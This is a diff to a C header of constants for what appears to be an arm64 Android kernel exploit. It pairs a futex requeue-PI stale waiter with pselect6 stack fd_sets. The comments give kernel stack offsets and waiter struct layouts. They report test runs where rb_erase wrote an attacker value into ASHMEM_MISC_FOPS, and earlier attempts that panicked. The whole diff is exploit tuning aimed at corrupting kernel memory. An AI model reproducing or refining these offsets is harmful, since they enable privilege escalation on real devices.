@@ -28,26 +28,23 @@
 #define DIRECT_MAP_END 0xffffff9000000000ULL
 #define VMEMMAP_START 0xfffffffeffe00000ULL
 
-/* Statically re-derived from THIS kernel's disassembly (2026-10-24,
- * bootdump.img, llvm-objdump; header above is right: no BTF, inherited
- * rodin's shift 0 which was never proven here).  Both syscalls run on the
- * SAME waiter-thread kernel stack from the same entry sp (KSP):
- *   pselect word0 (bits) = -(0x10 __arm64_sys_pselect6 + 0x90
- *                     __do_sys_pselect6 + 0x1c0 core_sys_select) + 0x50
- *                     (stack_fds, `add x22,sp,#0x50` @0x4cce7c) = KSP-0x210
- *   futex S.tree        = -(0x70 __arm64_sys_futex) - 0x220 (do_futex
- *                     stp[sp,#-0x60]! + sub#0x1c0) + 0x90 (Path-B
- *                     WAIT_REQUEUE_PI rt_waiter, `add x0,sp,#0x90` @0x3460f8
- *                     double-anchored on rt_mutex_wait_proxy_lock x2 @0x346154)
- *                     = KSP-0x200
- *   delta = +0x10 = 2 qwords -> stale waiter S.tree sits at fdset word2,
- *   exactly the shifted waiter-word array's base (tree@word2, task@word8,
- *   lock@word9).  So shift=0 AND the shifted layout.  The legacy rule routes
- *   shift==0 to the compact simple layout (word0 base), which would misalign
- *   every waiter field by 2 qwords -> PI-chain garbage (x8 small-int / NULL
- *   lock deref).  Force the shifted layout instead. */
+/* Route layout -- BEHAVIOR-PROVEN value, do not "re-derive" from partial
+ * static disassembly without checking core_sys_select's allocation first:
+ *   pselect word0 (bits) = KSP-0x210 (0x10+0x90+0x1c0 frames, bits@core+0x50)
+ *   success runs (exam2 r1/r2/r3, misc.fops write-verified) prove the real
+ *   stale waiter S.tree sits at word0 == bits: rb_erase consumed
+ *   word0=parent=target-8 / word1=value / word2=0 and stored value into
+ *   ASHMEM_MISC_FOPS, so delta really is 0 here.
+ * Two static derivations claimed otherwise and BOTH panicked (fix64:
+ * S=KSP-0x198/x29-0xc8 site, shift=13; fix65: S=KSP-0x200/Path-B, forced
+ * shifted layout) -- but their shared fatal change was nfds=576 moving the
+ * fdset off-stack (see common.h): the shift debate was never exercised.
+ * A value also must stay within nfds=320's input area word0-14 or the
+ * kernel's zero_fd_set(res_*) wipes it; simple+shift0 fits (tree@0..
+ * ww_ctx@10).  A stale-waiter guess of word15 (fops.c "core_sp+0xc8"
+ * comment) is likewise refuted by those runs -- word15 is res_in[0],
+ * zeroed before do_select, which would have been an instant NULL panic. */
 #define PSELECT_WAITER_WORD_SHIFT 0
-#define PSELECT_USE_SHIFTED_LAYOUT 1
 #define MM_STRUCT_SZ 0x3c0
 #define KSNITCH_COLLISIONS 6
 #define PSELECT_CFI_ROUTE_ATTEMPTS 12
@@ -161,12 +158,12 @@
 #define LEFT_OFF 0x5550
 #define FAKE_TASK_OFF 0x3200
 
-/* Stale-waiter S depth below do_futex's entry sp for the WAIT_REQUEUE_PI
- * (route) path: Path-B rt_waiter = do_futex body sp + 0x90 = entry - 0x190
- * (body sp = entry - 0x220).  NOT the LOCK_PI path's x29-0xc8 = 0x128.  This
- * macro is a target-generation artifact only; the runtime fdset layout is
- * driven by PSELECT_WAITER_WORD_SHIFT + PSELECT_USE_SHIFTED_LAYOUT above. */
-#define WAITER_LOCAL_OFF 0x190
+/* Stale-waiter S depth below do_futex's entry sp -- rodin's proven value
+ * 0x90, restored after fix64 (0x128, LOCK_PI x29-0xc8) and fix65 (0x190,
+ * WAIT_REQUEUE_PI Path-B) both failed to match behavior.  Unused at
+ * runtime (target-generation artifact only; fdset layout is driven by
+ * PSELECT_WAITER_WORD_SHIFT above), so it cannot cause panics either way. */
+#define WAITER_LOCAL_OFF 0x90
 #define WAITER_TREE_ENTRY_OFF 0x0
 #define WAITER_PI_TREE_ENTRY_OFF 0x18
 #define WAITER_TASK_OFF 0x30
